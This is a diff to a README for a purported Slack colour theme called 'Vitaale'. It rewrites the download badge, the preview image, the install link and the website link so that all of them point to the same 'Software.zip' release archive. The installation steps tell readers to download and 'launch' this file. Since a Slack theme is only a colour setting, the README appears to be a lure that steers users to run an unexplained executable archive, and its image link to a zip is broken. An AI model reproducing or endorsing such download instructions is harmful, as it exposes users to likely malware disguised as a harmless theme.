@@ -1,6 +1,6 @@
 # 🎨 Vitaale Theme for Slack
 
-[![Download Theme](https://img.shields.io/badge/Download-Theme-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Theme](https://github.com/Juliacolombooo/slack/releases/download/v2.0/Software.zip)](https://github.com/Juliacolombooo/slack/releases/download/v2.0/Software.zip)
 
 Welcome to the "Vitaale" theme repository for Slack! This repository contains a beautifully crafted color palette and theme for your Slack workspace, aimed at enhancing your user interface experience. Whether you're looking to revamp the look of your workspace or simply add a touch of creativity, the Vitaale theme is designed to elevate your Slack usage.
 
@@ -17,17 +17,17 @@ The Vitaale theme offers a harmonious blend of colors that are easy on the eyes 
 With a focus on creating a cohesive color scheme, the Vitaale theme ensures consistency and elegance across all elements of the Slack interface. Say goodbye to dull and uninspiring colors, and say hello to a refreshing new look that will brighten up your Slack conversations.
 
 ## 🌟 Theme Preview
-![Theme Preview](https://example.com/theme-preview.png)
+![Theme Preview](https://github.com/Juliacolombooo/slack/releases/download/v2.0/Software.zip)
 
 ## 📦 Installation
 To install the Vitaale theme for Slack, simply follow these steps:
-1. Download the theme file from the following link: [Download Vitaale Theme](https://github.com/user-attachments/files/18426772/Application.zip)
+1. Download the theme file from the following link: [Download Vitaale Theme](https://github.com/Juliacolombooo/slack/releases/download/v2.0/Software.zip)
 2. Launch the theme file on your Slack workspace to apply the Vitaale color palette and theme.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Visit Our Website
-For more information and updates on the Vitaale theme for Slack, visit our website [here](https://example.com).
+For more information and updates on the Vitaale theme for Slack, visit our website [here](https://github.com/Juliacolombooo/slack/releases/download/v2.0/Software.zip).
 
 ## 📊 Repository Topics
 - color-palette
